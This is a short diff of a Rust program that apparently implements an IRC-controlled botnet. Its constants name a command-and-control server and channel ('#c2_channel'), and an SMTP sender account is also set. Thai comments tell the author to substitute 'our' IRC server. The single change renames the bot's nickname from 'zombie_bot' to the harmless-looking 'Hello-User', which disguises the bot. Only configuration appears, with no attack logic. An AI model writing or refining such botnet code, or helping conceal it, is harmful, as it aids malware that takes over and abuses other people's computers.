@@ -16,7 +16,7 @@ use rand::{Rng, SeedableRng, rngs::StdRng};
 use sha3::{Digest, Sha3_256};
 
 const IRC_SERVER: &str = "irc.example.com";      // เปลี่ยนเป็น IRC server ของเรา
-const IRC_NICK: &str = "zombie_bot";
+const IRC_NICK: &str = "Hello-User";
 const IRC_CHANNEL: &str = "#c2_channel";         // ช่อง C2
 const SMTP_SERVER: &str = "smtp.gmail.com";      // หรือ server อื่น
 const SMTP_USER: &str = "bot@gmail.com";
